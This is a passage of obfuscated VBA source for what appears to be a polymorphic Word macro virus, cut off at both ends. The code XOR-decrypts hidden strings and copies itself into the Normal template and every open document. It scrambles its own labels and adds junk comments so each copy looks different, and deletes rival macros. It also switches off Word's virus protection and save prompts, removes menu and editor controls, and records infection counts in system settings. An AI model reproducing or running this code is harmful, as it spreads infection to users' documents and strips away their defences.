 Modul1(8) = "GoTo S02217RK"
 Modul1(9) = "GoTo MStoLEX"
 Modul2(0) = "S02217RK:"
 Modul2(1) = "Dim U4l6O6NO As Object"
 Modul2(2) = "Dim BNH7J As Object"
 Modul2(3) = "Dim CVS3lq As Object"
 Modul2(4) = "Dim XMh9n6h As Byte"
 Modul2(5) = "Dim X01TEQM As String"
 Modul2(6) = "Dim RRPU1a As String"
 Modul2(7) = "Dim W4XM5 As Variant"
 Modul2(8) = "Dim T0G9Jb As String"
 Modul2(9) = "Dim GflIa73P As String"
 Modul2(10) = "Dim M16G5E As Long"
 Modul2(11) = "Dim JXVd3djG As Long"
 Modul2(12) = "Dim AM4if6 As Long"
 Modul2(13) = "Dim PdwD8a As Long"
 Modul2(14) = "Dim Uo5hL7 As Long"
 Modul2(15) = "Dim P7WFD4 As Long"
 Modul2(16) = "Dim LS2m39 As String"
 Modul2(17) = "Dim GL3N32Ng As String"
 Modul2(18) = "Dim TQ29OG As String"
 Modul2(19) = "Dim KFSlBy As String"
 Modul2(20) = "Dim YhXdXf7 As Variant"
 Modul2(21) = "Dim SwMgP44 As Variant"
 Modul2(22) = "Dim An75uj As Variant"
 Modul2(23) = "Dim OtN9M As String"
 Modul2(24) = "Dim Pn56mO3 As Variant"
 Modul2(25) = "GoSub VvhD15Ok"
 Modul2(26) = "Randomize Timer"
 Modul2(27) = ""
 Modul2(28) = "GoTo E7swNF"
 Modul2(29) = "GoTo MStoLEX"
 Modul3(0) = "J54Jq0:"
 Modul3(1) = "PcDCm9n.InsertLines HB112LY, QEW3NE"
 Modul3(2) = "Return"
 Modul3(3) = "GoTo MStoLEX"
 Modul4(0) = "E7swNF:"
 Modul4(1) = "ReDim YhXdXf7(&O3) As String"
 Modul4(2) = "ReDim SwMgP44(&O2) As Long"
 Modul4(3) = "MF0wi = " & """" & "‡ÙªÇ�àîýÁÀ¬ŽÉ×‚ÓãÜì¸ÙÆ¶ÄÜ…ÎÛÏæ²áú“þÂòÁº–¦àîÏ³Ñ±�¿Æî‚Óù©‹¸öŸË" & """" & ": GoSub VXdgkhe6: YhXdXf7(0) = MF0wi"
 Modul4(4) = "MF0wi = " & """" & "œâ€ý»úÄÌóåœ­Æá§øÈë" & """" & ": GoSub VXdgkhe6: YhXdXf7(&O1) = MF0wi"
 Modul4(5) = "MF0wi = " & """" & "�÷ˆ÷£ØÄÌåè¼´æñ¸" & """" & ": GoSub VXdgkhe6: YhXdXf7(&O2) = MF0wi"
 Modul4(6) = "MF0wi = " & """" & "�÷ˆ÷£ØÄÌåè¼±ïõ¤ó×øÄ‚ÙÎ" & """" & ": GoSub VXdgkhe6: YhXdXf7(&O3) = MF0wi"
 Modul4(7) = "LS2m39 = System.PrivateProfileString("""", YhXdXf7(&O0), YhXdXf7(&O1))"
 Modul4(8) = "If LS2m39 <> """" Then"
 Modul4(9) = "AM4if6 = InStr(&O1, LS2m39, Chr(&O57)): SwMgP44(&O0) = Mid(LS2m39, 1, AM4if6 - &O1)"
 Modul4(10) = "PdwD8a = AM4if6 + &O1: AM4if6 = InStr(PdwD8a, LS2m39, Chr(&O57)): SwMgP44(&O1) = Mid(LS2m39, PdwD8a, AM4if6 - PdwD8a)"
 Modul4(11) = "SwMgP44(&O2) = Mid(LS2m39, AM4if6 + &O1)"
 Modul4(12) = "End If"
 Modul4(13) = ""
 Modul4(14) = "GoTo L8n9WKR"
 Modul4(15) = "GoTo MStoLEX"
 Modul5(0) = "L8n9WKR:"
 Modul5(1) = ""
 Modul5(2) = "MF0wi = " & """" & "œç�" & """" & ": GoSub VXdgkhe6: TQ29OG = MF0wi & Chr(&O40)"
 Modul5(3) = "MF0wi = " & """" & "Œý�í¤" & """" & ": GoSub VXdgkhe6: KFSlBy = MF0wi & Chr(&O40)"
 Modul5(4) = "Set U4l6O6NO = NormalTemplate: Set BNH7J = U4l6O6NO.VBProject.VBComponents.Item(1).CodeModule"
 Modul5(5) = "Set CVS3lq = U4l6O6NO: Set PcDCm9n = BNH7J"
 Modul5(6) = "With BNH7J"
 Modul5(7) = "If Not .Find(Fp5Gc6n, &O1, &O1, .CountOfLines, 1, False, False, False) Then"
 Modul5(8) = "For AM4if6 = 1 To Documents.Count"
 Modul5(9) = "Set U4l6O6NO = Documents.Item(AM4if6): Set BNH7J = U4l6O6NO.VBProject.VBComponents.Item(1).CodeModule"
 Modul5(10) = "If .Find(Fp5Gc6n, &O1, &O1, BNH7J.CountOfLines, 1, False, False, False) Then Exit For"
 Modul5(11) = "Next AM4if6"
 Modul5(12) = "End If"
 Modul5(13) = "End With"
 Modul5(14) = "If Documents.Count = &O0 Then Documents.Add"
 Modul5(15) = "For AM4if6 = &O0 To Documents.Count"
 Modul5(16) = "If AM4if6 > &O0 Then"
 Modul5(17) = "Set CVS3lq = Documents.Item(AM4if6)"
 Modul5(18) = "Set PcDCm9n = CVS3lq.VBProject.VBComponents.Item(&O1).CodeModule"
 Modul5(19) = "End If"
 Modul5(20) = "If CVS3lq <> U4l6O6NO Then"
 Modul5(21) = "With PcDCm9n"
 Modul5(22) = "Uo5hL7 = &O0: M16G5E = &O0"
 Modul5(23) = "If .Find(TQ29OG, M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
 Modul5(24) = "If .Find(KFSlBy, M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
 Modul5(25) = "GL3N32Ng = Mid(.Lines(M16G5E, &O1), InStr(.Lines(M16G5E, &O1), Chr(&O42)) + &O1)"
 Modul5(26) = "If InStr(GL3N32Ng, Chr(&O42)) > 0 Then"
 Modul5(27) = "GL3N32Ng = Left(GL3N32Ng, InStr(GL3N32Ng, Chr(&O42)))"
 Modul5(28) = "For PdwD8a = &O1 To Len(GL3N32Ng) - &O1: Uo5hL7 = vbCr & Uo5hL7 + Asc(Mid(GL3N32Ng, PdwD8a, &O1)): Next PdwD8a"
 Modul5(29) = "End If"
 Modul5(30) = "End If"
 Modul5(31) = "End If"
 Modul5(32) = "If Uo5hL7 <> &O43326 Then Exit For"
 Modul5(33) = "End With"
 Modul5(34) = "End If"
 Modul5(35) = "Next AM4if6"
 Modul5(36) = "If Uo5hL7 = &O43326 Then"
 Modul5(37) = "If SwMgP44(&O0) < &O2 And SwMgP44(&O0) > &O0 Then"
 Modul5(38) = "With PcDCm9n: Do While .CountOfLines > &O0: .DeleteLines 1: Loop: End With"
 Modul5(39) = "Else: GoTo DcJ7WD5"
 Modul5(40) = "End If"
 Modul5(41) = "End If"
 Modul5(42) = "GoTo OC9esi"
 Modul5(43) = "GoTo MStoLEX"
 Modul6(0) = "OC9esi:"
 Modul6(1) = "GflIa73P = Fp5Gc6n"
 Modul6(2) = "For AM4if6 = &O1 To Len(GflIa73P)"
 Modul6(3) = "PdwD8a = Int(Rnd * (Len(GflIa73P) - &O1)) + &O1: LS2m39 = Mid(GflIa73P, PdwD8a, &O1)"
 Modul6(4) = "Mid(GflIa73P, PdwD8a, &O1) = Mid(GflIa73P, AM4if6, &O1): Mid(GflIa73P, AM4if6, &O1) = LS2m39"
 Modul6(5) = "Next AM4if6"
 Modul6(6) = "GoTo XDP63"
 Modul6(7) = "GoTo MStoLEX"
 Modul7(0) = "XDP63:"
 Modul7(1) = "ReDim W4XM5(&O26) As String"
 Modul7(2) = "With BNH7J"
 Modul7(3) = "M16G5E = &O0: JXVd3djG = &O0"
 Modul7(4) = ".Find " & """" & "SHRm7m" & """" & " & Chr(&O72), M16G5E, &O0, &O0, &O0, True, True, False: If M16G5E = &O0 Then GoTo DcJ7WD5"
 Modul7(5) = ".Find " & """" & "MStoLEX" & """" & " & Chr(&O72), JXVd3djG, &O0, &O0, &O0, True, True, False: If JXVd3djG = &O0 Then GoTo DcJ7WD5"
 Modul7(6) = "For AM4if6 = M16G5E To JXVd3djG"
 Modul7(7) = "LS2m39 = Trim(.Lines(AM4if6, &O1))"
 Modul7(8) = "If LS2m39 <> """" And Left(LS2m39, &O1) <> Chr(&O47) Then T0G9Jb = T0G9Jb & String(Int(Rnd * &O12), Chr(&O40)) & LS2m39 & vbCr"
 Modul7(9) = "If Int(Rnd * &O12) + &O1 = &O1 Then T0G9Jb = T0G9Jb & vbCr"
 Modul7(10) = "If Int(Rnd * &O11) + &O1 > &O10 Then"
 Modul7(11) = "LS2m39 = """""
 Modul7(12) = "For PdwD8a = &O0 To Int(Rnd * &O11) + &O1: LS2m39 = LS2m39 & Rnd * (Rnd * &O23420) & vbTab: Next PdwD8a"
 Modul7(13) = "T0G9Jb = T0G9Jb & String(Int(Rnd * &O12), Chr(&O40)) & Chr(&O47) & LS2m39 & vbCr"
 Modul7(14) = "End If"
 Modul7(15) = "Next AM4if6"
 Modul7(16) = "End With"
 Modul7(17) = "GoTo TxGb0ns9"
 Modul7(18) = "GoTo MStoLEX"
 Modul8(0) = "TxGb0ns9:"
 Modul8(1) = "An75uj = Array(" & """" & "Yny7e7C" & """" & ", " & """" & "S02217RK" & """" & ", " & """" & "J54Jq0" & """" & ", " & """" & "E7swNF" & """" & ", " & """" & "L8n9WKR" & """" & ", " & """" & "OC9esi" & """" & ", " & """" & "XDP63" & """" & ", " & """" & "TxGb0ns9" & """" & ", " & """" & "RIud9DoA" & """" & ", " & """" & "O0hy73" & """" & ", " & """" & "E7KiNw0R" & """" & ", " & """" & "M6K4f0" & """" & ", " & """" & "VK8fm7H2" & """" & ", " & """" & "G8b3E" & """" & ", " & """" & "S7M988u" & """" & ", " & """" & "O192b" & """" & ", " & """" & "E1QdMs" & """" & ", " & """" & "Xg645Ye" & """" & ", " & """" & "VXdgkhe6" & """" & ", " & """" & "NwR7Xamt" & """" & ", " & """" & "R0Lsd" & """" & ", " & """" & "Iml96v3i" & """" & ", " & """" & "VvhD15Ok" & """" & ", " & """" & "MStoLEX" & """" & ")"
 Modul8(2) = "MF0wi = " & """" & "ˆý»ñ" & """" & ": GoSub VXdgkhe6: MF0wi = MF0wi & Chr(&O40) & An75uj(&O27)"
 Modul8(3) = "For AM4if6 = &O0 To &O26"
 Modul8(4) = "M16G5E = InStr(1, T0G9Jb, An75uj(AM4if6) & Chr(&O72) & vbCr)"
 Modul8(5) = "If M16G5E > 0 Then JXVd3djG = InStr(M16G5E, T0G9Jb, MF0wi) + Len(MF0wi) - M16G5E Else: GoTo DcJ7WD5"
 Modul8(6) = "If JXVd3djG > 0 Then W4XM5(AM4if6) = Mid(T0G9Jb, M16G5E, JXVd3djG) & vbCr"
 Modul8(7) = "Next AM4if6"
 Modul8(8) = "T0G9Jb = Left(T0G9Jb, InStr(T0G9Jb, Chr(&O72))) & vbCr & W4XM5(&O0)"
 Modul8(9) = "MF0wi = W4XM5(&O1): W4XM5(&O1) = W4XM5(&O2): W4XM5(&O2) = MF0wi"
 Modul8(10) = "For AM4if6 = &O3 To &O26"
 Modul8(11) = "PdwD8a = Int(Rnd * &O23) + &O3: MF0wi = W4XM5(AM4if6): W4XM5(AM4if6) = W4XM5(PdwD8a): W4XM5(PdwD8a) = MF0wi"
 Modul8(12) = "Next AM4if6"
 Modul8(13) = "For AM4if6 = &O1 To &O26: T0G9Jb = T0G9Jb & W4XM5(AM4if6): Next AM4if6"
 Modul8(14) = "T0G9Jb = T0G9Jb & vbCr & " & """" & "DcJ7WD5" & """" & " & Chr(&O72) & vbCr & An75uj(&O27) & Chr(&O72) & vbCr"
 Modul8(15) = "GoTo RIud9DoA"
 Modul8(16) = "GoTo MStoLEX"
 Modul9(0) = "RIud9DoA:"
 Modul9(1) = "MF0wi = " & """" & "Œý�í¤" & """" & ": GoSub VXdgkhe6"
 Modul9(2) = "M16G5E = InStr(&O1, T0G9Jb, MF0wi) + &O5"
 Modul9(3) = "If M16G5E > 0 Then JXVd3djG = InStr(M16G5E, T0G9Jb, Chr(&O75)) Else: GoTo DcJ7WD5"
 Modul9(4) = "X01TEQM = Trim(Mid(T0G9Jb, M16G5E + &O1, (JXVd3djG - M16G5E) - &O1)): GoSub Iml96v3i"
 Modul9(5) = "M16G5E = InStr(M16G5E, T0G9Jb, Chr(&O75)) + &O3"
 Modul9(6) = "If M16G5E > &O0 Then JXVd3djG = Len(T0G9Jb) - (M16G5E + Len(GflIa73P) - &O1) Else: GoTo DcJ7WD5"
 Modul9(7) = "If M16G5E > &O0 And Mid(T0G9Jb, M16G5E, Len(Fp5Gc6n)) = Fp5Gc6n Then"
 Modul9(8) = "Mid(T0G9Jb, M16G5E, Len(Fp5Gc6n)) = GflIa73P"
 Modul9(9) = "Else: GoTo DcJ7WD5"
 Modul9(10) = "End If"
 Modul9(11) = "GoTo O0hy73"
 Modul9(12) = "GoTo MStoLEX"
 Modul10(0) = "O0hy73:"
 Modul10(1) = "M16G5E = InStr(M16G5E + Len(Fp5Gc6n), T0G9Jb, Chr(&O47) & Chr(&O42)) + &O1"
 Modul10(2) = "If M16G5E > 0 Then JXVd3djG = InStr(M16G5E, T0G9Jb, vbCr) - &O1 Else: GoTo DcJ7WD5"
 Modul10(3) = "X01TEQM = Trim(Mid(T0G9Jb, M16G5E + &O1, (JXVd3djG - M16G5E) - &O1))"
 Modul10(4) = "AM4if6 = InStr(&O1, X01TEQM, Chr(&O57)): LS2m39 = Mid(X01TEQM, &O1, AM4if6 - &O1)"
 Modul10(5) = "PdwD8a = AM4if6 + &O1: AM4if6 = InStr(PdwD8a, X01TEQM, Chr(&O57))"
 Modul10(6) = "GL3N32Ng = Mid(X01TEQM, PdwD8a, AM4if6 - PdwD8a)"
 Modul10(7) = "TQ29OG = Mid(X01TEQM, AM4if6 + &O1)"
 Modul10(8) = "If CVS3lq = NormalTemplate Or SwMgP44(&O0) < LS2m39 Then SwMgP44(&O0) = LS2m39"
 Modul10(9) = "If SwMgP44(&O1) < GL3N32Ng Then SwMgP44(&O1) = GL3N32Ng"
 Modul10(10) = "If SwMgP44(&O2) < TQ29OG Then SwMgP44(&O2) = TQ29OG"
 Modul10(11) = "If CVS3lq = NormalTemplate Then SwMgP44(&O1) = SwMgP44(&O1) + &O1 Else SwMgP44(&O2) = SwMgP44(&O2) + &O1"
 Modul10(12) = "System.PrivateProfileString("""", YhXdXf7(&O0), YhXdXf7(&O1)) = SwMgP44(&O0) & Chr(&O57) & SwMgP44(&O1) & Chr(&O57) & SwMgP44(&O2)"
 Modul10(13) = "LS2m39 = SwMgP44(&O0) & Chr(&O57) & SwMgP44(&O1) & Chr(&O57) & SwMgP44(&O2)"
 Modul10(14) = "T0G9Jb = Left(T0G9Jb, M16G5E) & LS2m39 & Right(T0G9Jb, Len(T0G9Jb) - (JXVd3djG - &O1))"
 Modul10(15) = "GoTo E7KiNw0R"
 Modul10(16) = "GoTo MStoLEX"
 Modul11(0) = "E7KiNw0R:"
 Modul11(1) = "JXVd3djG = InStr(M16G5E, T0G9Jb, vbCr) + &O1"
 Modul11(2) = "Do While JXVd3djG > &O0"
 Modul11(3) = "M16G5E = InStr(JXVd3djG + &O3, T0G9Jb, Chr(&O75) & Chr(&O40) & Chr(&O42)) + &O3"
 Modul11(4) = "If M16G5E > &O3 Then JXVd3djG = InStr(M16G5E, T0G9Jb, Chr(&O42)) Else JXVd3djG = &O0"
 Modul11(5) = "If JXVd3djG > &O0 Then"
 Modul11(6) = "MF0wi = Trim(Mid(T0G9Jb, M16G5E, JXVd3djG - M16G5E))"
 Modul11(7) = "If MF0wi <> """" Then GoSub NwR7Xamt"
 Modul11(8) = "T0G9Jb = Left(T0G9Jb, M16G5E - &O1) & MF0wi & Mid(T0G9Jb, JXVd3djG)"
 Modul11(9) = "End If"
 Modul11(10) = "Loop"
 Modul11(11) = "GoTo M6K4f0"
 Modul11(12) = "GoTo MStoLEX"
 Modul12(0) = "M6K4f0:"
 Modul12(1) = "JXVd3djG = &O1"
 Modul12(2) = "Do While JXVd3djG > &O0"
 Modul12(3) = "M16G5E = InStr(JXVd3djG + &O3, T0G9Jb, Chr(&O104) & Chr(&O151) & Chr(&O155))"
 Modul12(4) = "If M16G5E > &O0 Then JXVd3djG = InStr(M16G5E + &O3, T0G9Jb, Chr(&O101) & Chr(&O163)) Else JXVd3djG = 0"
 Modul12(5) = "If JXVd3djG > &O0 Then"
 Modul12(6) = "X01TEQM = Trim(Mid(T0G9Jb, M16G5E + &O3, (JXVd3djG - M16G5E) - &O3))"
 Modul12(7) = "If InStr(X01TEQM, Chr(&O50)) = &O0 Then GoSub Iml96v3i"
 Modul12(8) = "End If"
 Modul12(9) = "Loop"
 Modul12(10) = "GoTo VK8fm7H2"
 Modul12(11) = "GoTo MStoLEX"
 Modul13(0) = "VK8fm7H2:"
 Modul13(1) = "JXVd3djG = &O1: M16G5E = &O1"
 Modul13(2) = "Do While JXVd3djG > &O0"
 Modul13(3) = "JXVd3djG = InStr(M16G5E, T0G9Jb, Chr(&O72) & vbCr)"
 Modul13(4) = "If JXVd3djG - 20 > &O0 Then"
 Modul13(5) = "M16G5E = JXVd3djG - 20: AM4if6 = &O0"
 Modul13(6) = "Do: M16G5E = M16G5E + AM4if6: AM4if6 = InStr(&O1, Trim(Mid(T0G9Jb, M16G5E + &O1, (JXVd3djG - M16G5E) - &O1)), vbCr): Loop Until AM4if6 = &O0"
 Modul13(7) = "M16G5E = M16G5E + &O1"
 Modul13(8) = "End If"
 Modul13(9) = "If JXVd3djG - M16G5E > &O0 Then"
 Modul13(10) = "X01TEQM = Trim(Mid(T0G9Jb, M16G5E, JXVd3djG - M16G5E)): GoSub Iml96v3i"
 Modul13(11) = "Else: Exit Do"
 Modul13(12) = "End If"
 Modul13(13) = "M16G5E = InStr(M16G5E, T0G9Jb, Chr(&O72) & vbCr) + &O2"
 Modul13(14) = "Loop"
 Modul13(15) = "GoTo G8b3E"
 Modul13(16) = "GoTo MStoLEX"
 Modul14(0) = "G8b3E:"
 Modul14(1) = "ReDim Pn56mO3("
 Modul14(2) = "MF0wi = " & """" & "œç�¾†ÅÄÉÖÎ°¬ìñ" & """" & ": GoSub VXdgkhe6: Pn56mO3(&O0) = MF0wi"
 Modul14(3) = "MF0wi = " & """" & "œç�¾„ÃÎÒóÁ’ úû" & """" & ": GoSub VXdgkhe6: Pn56mO3(&O1) = MF0wi"
 Modul14(4) = "MF0wi = " & """" & "œç�¾–ÅÍÛÔéž³äõ¾ÿÞ" & """" & ": GoSub VXdgkhe6: Pn56mO3(&O2) = MF0wi"
 Modul14(5) = "MF0wi = " & """" & "œç�¾„ÃÎÒóÃƒ·áû¤é" & """" & ": GoSub VXdgkhe6: Pn56mO3(&O3) = MF0wi"
 Modul14(6) = "MF0wi = " & """" & "Ÿà†è±ØÄ" & """" & ": GoSub VXdgkhe6: Pn56mO3(&O4) = MF0wi & Chr(&O40)"
 Modul14(7) = "MF0wi = " & """" & "Šü‹¾ƒÙÃ" & """" & ": GoSub VXdgkhe6: Pn56mO3(&O5) = MF0wi"
 Modul14(8) = ""
 Modul14(9) = "GoTo S7M988u"
 Modul14(10) = "GoTo MStoLEX"
 Modul15(0) = "S7M988u:"
 Modul15(1) = "Dim DBWmd8T As Object"
 Modul15(2) = "For AM4if6 = &O1 To CVS3lq.VBProject.VBComponents.Count"
 Modul15(3) = "Set DBWmd8T = CVS3lq.VBProject.VBComponents(AM4if6).CodeModule"
 Modul15(4) = "With DBWmd8T"
 Modul15(5) = "For PdwD8a = &O0 To &O3"
 Modul15(6) = "M16G5E = &O0"
 Modul15(7) = "If .Find(Pn56mO3(PdwD8a), M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
 Modul15(8) = "For Uo5hL7 = M16G5E To .CountOfLines"
 Modul15(9) = "LS2m39 = Trim(.Lines(Uo5hL7, &O1))"
 Modul15(10) = ".DeleteLines Uo5hL7: Uo5hL7 = Uo5hL7 - &O1"
 Modul15(11) = "If LS2m39 = Pn56mO3(&O5) Then Exit For"
 Modul15(12) = "Next Uo5hL7"
 Modul15(13) = "End If"
 Modul15(14) = "Next PdwD8a"
 Modul15(15) = "End With"
 Modul15(16) = "Next AM4if6"
 Modul15(17) = "GoTo O192b"
 Modul15(18) = "GoTo MStoLEX"
 Modul16(0) = "O192b:"
 Modul16(1) = "With PcDCm9n"
 Modul16(2) = "GoSub R0Lsd: LS2m39 = RRPU1a"
 Modul16(3) = "For AM4if6 = &O6 To UBound(Pn56mO3)"
 Modul16(4) = "M16G5E = &O0"
 Modul16(5) = "If .Find(Pn56mO3(AM4if6), M16G5E, &O1, .CountOfLines, 1, False, False, False) Then"
 Modul16(6) = "HB112LY = M16G5E + &O1: QEW3NE = LS2m39: GoSub J54Jq0"
 Modul16(7) = "Else"
 Modul16(8) = "HB112LY = .CountOfLines + &O1: QEW3NE = Pn56mO3(&O4) & Pn56mO3(AM4if6) & vbCr & LS2m39 & vbCr & Pn56mO3(&O5): GoSub J54Jq0"
 Modul16(9) = "End If"
 Modul16(10) = "Next AM4if6"
 Modul16(11) = "MF0wi = " & """" & "œç�" & """" & ": GoSub VXdgkhe6: LS2m39 = MF0wi & Chr(&O40): M16G5E = &O0"
 Modul16(12) = "If .Find(LS2m39, M16G5E, &O1, .CountOfLines, 1, False, False, False) Then HB112LY = M16G5E Else HB112LY = &O1"
 Modul16(13) = "QEW3NE = Pn56mO3(&O4) & LS2m39 & RRPU1a & vbCr & T0G9Jb & Pn56mO3(&O5) & vbCr: GoSub J54Jq0"
 Modul16(14) = "End With"
 Modul16(15) = "GoTo E1QdMs"
 Modul16(16) = "GoTo MStoLEX"
 Modul17(0) = "E1QdMs:"
 Modul17(1) = "If CVS3lq = NormalTemplate Then"
 Modul17(2) = "Set PcDCm9n = CVS3lq.VBProject.VBComponents.Add(&O1).CodeModule"
 Modul17(3) = "HB112LY = PcDCm9n.CountOfLines + &O1: QEW3NE = vbCr"
 Modul17(4) = "For AM4if6 = &O0 To &O3: QEW3NE = QEW3NE & Pn56mO3(AM4if6) & vbCr & Pn56mO3(&O5) & vbCr: Next AM4if6: GoSub J54Jq0"
 Modul17(5) = "NormalTemplate.Save"
 Modul17(6) = "ElseIf ActiveDocument.Path <> """" Then ActiveDocument.Save"
 Modul17(7) = "End If"
 Modul17(8) = "GoSub Xg645Ye"
 Modul17(9) = "GoTo DcJ7WD5"
 Modul17(10) = "GoTo MStoLEX"
 Modul18(0) = "Xg645Ye:"
 Modul18(1) = "MF0wi = " & """" & "‚àÁ¾ƒÜÎÝë" & """" & ": GoSub VXdgkhe6: LS2m39 = MF0wi & Chr(&O40) & SwMgP44(&O0) & Chr(&O56) & SwMgP44(&O1) & Chr(&O56) & SwMgP44(&O2) & Chr(&O40) & Chr(&O102)"
 Modul18(2) = "System.PrivateProfileString("""", YhXdXf7(&O0), YhXdXf7(&O2)) = LS2m39"
 Modul18(3) = "MF0wi = " & """" & "ŒýŸç¢ÅÆÖô" & """" & ": GoSub VXdgkhe6: LS2m39 = MF0wi"
 Modul18(4) = "MF0wi = " & """" & "ý¢ß®ðÿÑÑãçÞ•ýø¡ûÃ¹ó„ÄÐ­ÁÜƒÂèì¡" & """" & ": GoSub VXdgkhe6: LS2m39 = LS2m39 & Chr(&O40) & Chr(&O251) & Chr(&O40) & MF0wi"
 Modul18(5) = "System.PrivateProfileString("""", YhXdXf7(&O0), YhXdXf7(&O3)) = LS2m39"
 Modul18(6) = "Return"
 Modul18(7) = "GoTo MStoLEX"
 Modul19(0) = "VXdgkhe6:"
 Modul19(1) = "For XMh9n6h = &O1 To Len(MF0wi)"
 Modul19(2) = "Mid(MF0wi, XMh9n6h, &O1) = Chr(Asc(Mid(MF0wi, XMh9n6h, &O1)) Xor Asc(Mid(Fp5Gc6n, XMh9n6h, &O1)))"
 Modul19(3) = "Next XMh9n6h"
 Modul19(4) = "Return"
 Modul19(5) = "GoTo MStoLEX"
 Modul20(0) = "NwR7Xamt:"
 Modul20(1) = "For XMh9n6h = &O1 To Len(MF0wi)"
 Modul20(2) = "Mid(MF0wi, XMh9n6h, &O1) = Chr(Asc(Chr(Asc(Mid(MF0wi, XMh9n6h, &O1)) Xor Asc(Mid(Fp5Gc6n, XMh9n6h, &O1)))) Xor Asc(Mid(GflIa73P, XMh9n6h, &O1)))"
 Modul20(3) = "Next XMh9n6h"
 Modul20(4) = "Return"
 Modul20(5) = "GoTo MStoLEX"
 Modul21(0) = "R0Lsd:"
 Modul21(1) = "RRPU1a = Chr(Int(Rnd * &O31) + &O101)"
 Modul21(2) = "For XMh9n6h = &O1 To Int(Rnd * &O4) + &O4"
 Modul21(3) = "Select Case Int((Rnd * &O3) + &O1)"
 Modul21(4) = "Case &O1: RRPU1a = RRPU1a & Chr(Int(Rnd * &O31) + &O101)"
 Modul21(5) = "Case &O2: RRPU1a = RRPU1a & Chr(Int(Rnd * &O12) + &O60)"
 Modul21(6) = "Case &O3: RRPU1a = RRPU1a & Chr(Int(Rnd * &O31) + &O141)"
 Modul21(7) = "End Select"
 Modul21(8) = "Next XMh9n6h: If InStr(&O1, T0G9Jb, RRPU1a) <> &O0 Then GoTo R0Lsd"
 Modul21(9) = "Return"
 Modul21(10) = "GoTo MStoLEX"
 Modul22(0) = "Iml96v3i:"
 Modul22(1) = "GoSub R0Lsd"
 Modul22(2) = "AM4if6 = &O0 - Len(RRPU1a)"
 Modul22(3) = "Do While AM4if6 <> &O0"
 Modul22(4) = "AM4if6 = InStr(AM4if6 + Len(RRPU1a) + &O1, T0G9Jb, X01TEQM)"
 Modul22(5) = "If AM4if6 > &O0 Then T0G9Jb = Left(T0G9Jb, AM4if6 - &O1) & RRPU1a & Right(T0G9Jb, (Len(T0G9Jb) - (AM4if6 + Len(X01TEQM)) + &O1))"
 Modul22(6) = "Loop"
 Modul22(7) = "Return"
 Modul22(8) = "GoTo MStoLEX"
 Modul23(0) = "VvhD15Ok:"
 Modul23(1) = "On Error Resume Next"
 Modul23(2) = "Dim YBx34exD As Variant"
 Modul23(3) = "YBx34exD = Array(&O72501, &O1357, &O1435, &O1012, &O520, &O72535)"
 Modul23(4) = "With Options"
 Modul23(5) = ".VirusProtection = (&O1 - &O1): .SaveNormalPrompt = (&O1 - &O1): .ConfirmConversions = (&O1 - &O1): .AllowFastSave = (&O1 - &O1)"
 Modul23(6) = ".BackgroundSave = (&O1 - &O1): .CreateBackup = (&O1 - &O1): .SavePropertiesPrompt = (&O1 - &O1): .SaveInterval = &O0"
 Modul23(7) = "End With"
 Modul23(8) = "For AM4if6 = &O0 To &O5: Set U4l6O6NO = Application.CommandBars.FindControl(ID:=YBx34exD(AM4if6)): U4l6O6NO.Enabled = (1 - 1): U4l6O6NO.Delete: Next AM4if6"
 Modul23(9) = "With Application.VBE.CommandBars"
 Modul23(10) = "Set U4l6O6NO = .FindControl(ID:=&O1642): U4l6O6NO.Enabled = (&O1 - &O1): U4l6O6NO.Delete"
 Modul23(11) = "Set U4l6O6NO = .FindControl(ID:=&O1012): U4l6O6NO.Enabled = (&O1 - &O1): U4l6O6NO.Delete"
 Modul23(12) = "End With"
 Modul23(13) = "With Application"
 Modul23(14) = ".ScreenUpdating = (&O1 - &O1): .ShowVisualBasicEditor = (&O1 - &O1): .EnableCancelKey = wdCancelDisabled: .DisplayAlerts = wdAlertsNone"
 Modul23(15) = "MF0wi = " & """" & "™ûœë±À�üáÿš " & """" & ": GoSub VXdgkhe6: .CommandBars(MF0wi).Enabled = (&O1 - &O1): .CommandBars(MF0wi).Visible = (&O1 - &O1)"
 Modul23(16) = "MF0wi = " & """" & "›ý€ò£" & """" & ": GoSub VXdgkhe6: .VBE.CommandBars(MF0wi).Enabled = (&O1 - &O1)"
 Modul23(17) = "End With"
 Modul23(18) = "With System"
 Modul23(19) = "MF0wi = " & """" & "‡ÙªÇ�ïôìÒÉ½—×Á™ßÿÅã„ÐÔµÒÏ’÷Êëì£üæ�÷ÐÚË¯¾”ËçÞ©î—" & """" & ": GoSub VXdgkhe6: LS2m39 = MF0wi"
 Modul23(20) = "MF0wi = " & """" & "þ²Þ¾áŒ�ž±¬Âã¹´ûºœ¹�Ë‡€ó“Œ×š§³¯à" & """" & ": GoSub VXdgkhe6: GL3N32Ng = MF0wi"
 Modul23(21) = "MF0wi = " & """" & "Œý‹û’ÍÂÕÃãŸ¬úç" & """" & ": GoSub VXdgkhe6: .PrivateProfileString("""", LS2m39, MF0wi) = GL3N32Ng"
 Modul23(22) = "MF0wi = " & """" & "Œý‹û–ÃÓÛÃãŸ¬úç" & """" & ": GoSub VXdgkhe6: .PrivateProfileString("""", LS2m39, MF0wi) = GL3N32Ng"
 Modul23(23) = "End With"
 Modul23(24) = "On Error GoTo DcJ7WD5"
 Modul23(25) = "Return"
 Modul23(26) = "GoTo MStoLEX"
End Sub

Public Function TestCodierung(ByVal Txt As String) As Boolean
 Dim TestStr As String, x As Byte
 TestCodierung = False
 TestStr = DeCrypt(Txt, VS)
 For x = 1 To Len(TestStr)
  If Asc(Mid(TestStr, x, 1)) < 127 Then Exit Function
 Next x
 TestCodierung = True
End Function

Public Sub PGP_Schlüssel()
 Dim ASCModul(120) As String, x As Byte
 Const DateiName = "C:\Mister Spock.asc"
 On Error GoTo fehler
  ASCModul(0) = DeCrypt("â¿Â³ýîäùÉÂÓ“ÏÄêÊøÛü¢õ€‰öä×éËÍÌš¾¸Í¼‰", VS)
  ASCModul(1) = DeCrypt("™÷�í¹ÃÏ„ Ü´“îæ¯ÿÚøÂŽ––ì†“Æ‹Îìûÿ³ó�ã„èòƒÒ«ëìÕ¥ÿ‘�¬Ø«™ÔÊìÅ£ë„Õ�”�ïÍ�¾ë†Øœ‹ú�ÍÈÓÝþŒŒËïŸ‰¼Ñ¢", VS)
  ASCModul(2) = ""
